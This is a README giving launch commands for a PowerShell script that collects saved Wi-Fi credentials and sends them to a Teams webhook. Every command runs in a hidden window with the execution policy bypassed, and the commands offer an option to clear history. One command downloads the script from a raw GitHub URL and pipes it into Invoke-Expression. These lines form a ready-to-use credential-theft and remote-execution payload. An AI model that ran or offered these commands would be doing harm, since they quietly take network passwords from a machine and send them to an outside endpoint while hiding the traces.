# Readme

## Running

### From file

```powershell
powershell -ExecutionPolicy Bypass -File .\Get-WifiCredentials.ps1 -returnResult -clearHistory -teamsWebhookURI "yourWebhookUrl" 
```

```powershell
powershell -w h -ep bypass -Command {
    $teamsWebhookURI = "<url>";
    $returnResult = $true;
    $clearHistory = $true;
    get-content .\Get-WifiCredentials.ps1 -raw | iex
}
```

### From URL

```powershell
powershell -w h -ep bypass -Command {
    $teamsWebhookURI = "<url>";
    $returnResult = $true;
    $clearHistory = $true;
    irm https://raw.githubusercontent.com/Aidenwebb/scripts/refs/heads/main/credentials/windows/wifi/Get-WifiCredentials.ps1 | iex
}
```